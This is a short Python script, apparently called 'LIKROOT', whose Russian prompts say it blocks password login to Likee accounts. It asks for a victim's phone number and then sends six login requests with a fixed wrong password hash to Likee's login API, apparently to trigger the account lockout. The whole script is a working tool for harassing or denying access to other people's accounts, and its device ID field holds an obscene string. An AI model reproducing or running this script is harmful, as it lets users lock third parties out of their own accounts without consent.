logo = """

╭━━╮╭╮╱╱╭━━━┳━━━┳╮╭━╮
┃╭╮┃┃┃╱╱┃╭━╮┃╭━╮┃┃┃╭╯
┃╰╯╰┫┃╱╱┃┃╱┃┃┃╱╰┫╰╯╯
┃╭━╮┃┃╱╭┫┃╱┃┃┃╱╭┫╭╮┃
┃╰━╯┃╰━╯┃╰━╯┃╰━╯┃┃┃╰╮
╰━━━┻━━━┻━━━┻━━━┻╯╰━╯

"""

import time
import os
import requests
import colorama
from colorama import Fore
import platform



if platform.system() == "Windows": 
    os.system("title [+] LIKROOT")
    st = "python LIKROOT.py"
    dl = "cls"
    os.system("cls")
else:
    dl = "clear"
    st = "python3 LIKROOT.py"
    os.system("clear")




colorama.init()


url = "https://api.like-video.com/likee-activity-flow-micro/accountApi/loginByTelAndPwd"



print(Fore.RED + logo)
print(Fore.CYAN + "БЛОКИРУЕТ ВХОД ПО ПАРОЛЮ В LIKEE")
print("Укажите Номер ниже! Пример: 79999999999")
print("")
phone = input("Phone>")
pas = "98613b3292cb59cfecf590c0b434dab7"

bot = {
    "account": phone,
    "countryCode": "RU",
    "deviceId": "hueblantebepizda00045",
    "lang": "ru",
    "password": pas
}


for i in range(0, 6):
    res = requests.post(url, json=bot)
    print(res.text)
    time.sleep(1)


print("Готово")
input("Нажмите Enter")
os.system(dl)
os.system(st)
    





